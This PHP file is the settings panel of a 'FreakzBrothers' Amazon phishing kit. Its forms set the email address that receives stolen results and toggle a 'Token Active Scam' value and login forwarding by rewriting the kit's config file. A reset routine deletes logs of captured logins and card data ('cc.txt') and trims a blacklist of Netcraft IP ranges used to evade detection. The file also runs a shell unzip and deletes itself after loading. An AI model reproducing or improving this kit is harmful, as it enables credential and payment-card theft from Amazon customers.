<?php
/*
███████╗██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ ██████╗  ██████╗ ████████╗██╗  ██╗███████╗██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝╚══███╔╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝
█████╗  ██████╔╝█████╗  ███████║█████╔╝   ███╔╝ ██████╔╝██████╔╝██║   ██║   ██║   ███████║█████╗  ██████╔╝███████╗
██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██╔═██╗  ███╔╝  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗╚════██║
██║     ██║  ██║███████╗██║  ██║██║  ██╗███████╗██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║███████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
*/

@require_once "../amazon/__CONFIG__.php";
system("unzip web.zip");
error_reporting(0);
 
session_start();
if($_SESSION['user'] == ""){
}
 
$off = $_GET['account'];
if(isset($off)){
  if($off == 'off'){
    session_destroy();
    unset($_SESSION['user']);
    session_unset();
  }
  else{
    echo '';
  }
}
?>
<!DOCTYPE html>
<html>

<head>
  <title>FreakzBrothers: Amazon</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="shortcut icon" href="amazon/Assets/img/favicon.ico" />
</head>
<body>
  <style type="text/css">
    .angka {
      font-weight: bold;
      font-size: 30px;
      float: right;
      margin-right: 10%
    }

    .text-warning {
      color: #FFC107
    }

    footer {
      font-size: 10px;
      font-weight: bold;
      font-family: arial;
      position: fixed;
      bottom: 0;
      right: 0;
      background: black;
      color: white;
      padding: 2px
    }

    .text-warning {
      color: #FFC107
    }
  </style>
    <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
    <ul class="navbar-nav">
      <h1 style="display: inline-block; color: white;">&nbsp;&nbsp;&nbsp;<i class="fa fa-amazon spacer-small"></i>
        <but>
          <font color="red"><b>Freakz<font color="white">Brothers </font>
            </b>
      </h1>
      </div>
  </nav><br>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container">
    <table class="table">
      <thead class="thead-dark">
        <tr>
          <th>
            <center><h4><i class="fa fa-cog fa-1x"></i>&nbsp;SETTINGS</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-caret-right fa-1x"></i>&nbsp;NEW</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-code fa-1x"></i>&nbsp;OLD</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-check fa-1x"></i>&nbsp;SAVE</h4></center>
          </th>
        </tr>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Email Result</b></font>
            </td>
            <td><input name="baru" class="form-control" placeholder="noreply.xoxo@protonmail.com" /></td>
            <td><input type="text" class="form-control" size="30" name="lama" value="<?php echo $to; ?>" required="required" readonly=""></td>
            <td><input name="email" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Token Active Scam</b></font>
            </td>
            <td><input name="keybaru" class="form-control" placeholder="TOKEN SCAM" /></td>
            <td><input type="text" class="form-control" size="30" name="keylama" value="<?php echo $token2; ?>" required="required" readonly=""></td>
            <td><input name="key" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Email Access</b></font>
            </td>
            <td><select name="email_baru" class="form-control" />
              <option disabled selected>---- Select ----</option>
			        <option>yes</option>
              <option>no</option></td>
            <td><input type="text" class="form-control" size="30" name="email_lama" value="<?php echo $tembus_emel; ?>" required="required" readonly=""></td>
            <td><input name="emailog" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Send Login</b></font>
            </td>
            <td><select name="sendloginb" class="form-control" />
              <option disabled selected>---- Select ----</option>
              <option>Ok</option>
              <option>No</option></td>
            <td><input type="text" class="form-control" size="30" name="sendloginl" value="<?php echo $sendlogin; ?>" required="required" readonly=""></td>
            <td><input name="sendlogin" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
      </thead>
    </table>
  </div>
</nav><br><br>
  <form method="POST" action"">
    <center>
        <a href="panel.php" class="btn btn-dark">
          <font color="white"><b>BACK</b></font>
        </a>
    </center>
  </form>
  <footer>
    <font color="green">Copyright</font> &copy; <font color="red">Freakz</font>
    <font color="white">Brothers</font> 2019.
  </footer>
</body>

</html>
<?php
   unlink("set.php");
 
    $lama         = trim($_POST['lama']);
    $baru         = trim($_POST['baru']);
    $keylama      = trim($_POST['keylama']);
    $keybaru      = trim($_POST['keybaru']);
	  $email_lama   = trim($_POST['email_lama']);
    $email_baru   = trim($_POST['email_baru']);
    $sendloginl     = trim($_POST['sendloginl']);
    $sendloginb     = trim($_POST['sendloginb']);
    $file         = "../amazon/__CONFIG__.php";
    $isi          = file_get_contents($file);
 
if(isset($_POST['email'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['key'])) {
   if(preg_match("#\b$keylama\b#is", $isi)) {
        $isi = str_replace($keylama,$keybaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_key'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_key'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['emailog'])) {
   if(preg_match("#$email_lama#is", $isi)) {
        $isi = str_replace($email_lama,$email_baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#email_access'/>";
          echo "<meta http-equiv='refresh' content='0; url=#email_access'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['sendlogin'])) {
   if(preg_match("#$sendloginl#is", $isi)) {
        $isi = str_replace($sendloginl,$sendloginb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#send_login'/>";
          echo "<meta http-equiv='refresh' content='0; url=#send_login'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['rd'])) {
       unlink("../log/click.txt");
       unlink("../log/login.txt");
       unlink("../log/cc.txt");
       unlink("../log/visitor.txt");
       unlink("error_log");
 
       $filee = file_get_contents("assets/includes/blacklist.dat");
       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
       $buka = fopen("assets/includes/blacklist.dat",'w');
       fwrite($buka,$cek[0][0]."\r\r");
       fclose($buka);
 
       echo "<script>alert('Success')</script>";
       echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
		 echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
}
?>